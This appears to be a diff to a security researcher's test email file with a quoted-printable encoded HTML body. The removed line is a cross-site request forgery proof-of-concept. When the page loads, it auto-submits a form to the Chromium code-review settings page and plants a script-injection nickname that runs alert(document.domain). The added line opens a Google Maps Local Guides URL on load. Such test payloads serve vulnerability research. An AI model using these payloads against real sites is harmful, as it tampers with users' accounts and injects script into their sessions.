@@ -2,5 +2,5 @@ TESTEML
 Content-Type: text/html
 Content-Transfer-Encoding: quoted-printable
 
-=3Cbody=20onload=3D=22document.forms=5B0=5D.submit()=3B=22=3E=3Cform=20action=3D=22https=3A=2F=2Fcodereview.chromium.org=2Fsettings=22=20method=3D=22POST=22=3E=3Cinput=20type=3D=22hidden=22=20name=3D=22xsrf_token=22=20value=3D=22qqqq=22=3E=3Cinput=20type=3D=22hidden=22=20name=3D=22nickname=22=20value=3D=22q=26=23x3C=3Bscript=26=23x3E=3Balert(document.domain)=26=23x3C=3B=2Fscript=26=23x3E=3Bqq=22=3E=3C=2Fform=3E=3C=2Fbody=3E
+=3Cbody=20onload=3D=22window.open(=27https=3A=2F=2Fmaps.google.com=2Flocalguides=2Fapi=2Flocal_guide=2Flocal_guide_main=3Fmeetup_meetup_slug=3D9b891f32c2a646e48bbf484448ad567a=26views=3Dmeetup=27=2C=27_SELF=27)=22=3E=3C=2Fbody=3E
 
